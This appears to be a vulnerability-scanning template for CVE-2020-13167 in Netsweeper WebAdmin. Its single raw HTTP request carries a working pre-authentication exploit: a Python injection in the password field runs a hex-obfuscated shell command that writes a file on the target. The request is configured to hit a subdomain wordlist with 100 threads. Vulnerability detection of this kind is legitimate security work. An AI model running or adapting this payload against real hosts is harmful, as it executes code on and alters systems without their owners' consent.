id: CVE-2020-13167 1
info:
  author: dwisiswant0
  description: Netsweeper through 6.4.3 allows unauthenticated remote code execution
    because webadmin/tools/unixlogin.php (with certain Referer headers) launches a
    command line with client-supplied parameters, and allows injection of shell metacharacters.
  name: Netsweeper WebAdmin unixlogin.php Python Code Injection
  reference: '- https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/

    - https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says

    '
  severity: critical
  tags: cve,cve2020,netsweeper,rce
requests:
- attack: sniper
  matchers:
  - part: body
    type: word
    words:
    - nonexistent
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5
    HTTP/1.1

    Host: {{Subdomains}}

    Referer: "http://{{Subdomains}}/webadmin/admin/service_manager_data.php"

    User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
    (KHTML, like Gecko)"

    '
  threads: 100
